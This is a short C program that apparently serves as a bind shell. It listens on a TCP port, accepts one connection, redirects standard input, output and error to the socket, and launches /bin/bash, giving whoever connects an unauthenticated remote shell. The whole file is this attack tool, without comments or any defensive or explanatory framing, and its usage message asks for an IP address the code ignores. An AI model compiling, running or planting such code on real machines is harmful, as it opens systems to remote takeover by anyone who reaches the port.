#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<netinet/in.h>
#include<sys/socket.h>

void err_exit(const char *errmsg) {

	fprintf(stderr , "%s\n" , errmsg);
	exit(1);
}


int main(int argc , char **argv) {

	if(argc != 3) {
		fprintf(stderr , "Usage: $%s <ipaddr> <port>\n" , argv[0]);
		exit(1);
	}

	struct sockaddr_in serveraddr;
	struct sockaddr_in clientaddr;

	memset(&serveraddr , '\0' , sizeof(serveraddr));
	serveraddr.sin_family = PF_INET;
	serveraddr.sin_port = htons(atoi(argv[2]));
	serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);

	int listen_sockfd;
	if((listen_sockfd = socket(PF_INET , SOCK_STREAM , IPPROTO_TCP)) == -1)
		err_exit("Error in socket()");

	if(bind(listen_sockfd , (struct sockaddr *)&serveraddr , sizeof(serveraddr)) == -1)
		err_exit("Error in bind()");

	if(listen(listen_sockfd , 0) == -1)
		err_exit("Error in listen()");
	
	int new_sockfd;
	int clientaddrlen = sizeof(clientaddr);
	if((new_sockfd = accept(listen_sockfd , (struct sockaddr *)&clientaddr, &clientaddrlen)) == -1)
		err_exit("Error in accept()");


	dup2(new_sockfd , 0);
	dup2(new_sockfd , 1);
	dup2(new_sockfd , 2);


		system("/bin/bash");

	close(listen_sockfd);
	close(new_sockfd);

	return 0;
}
	









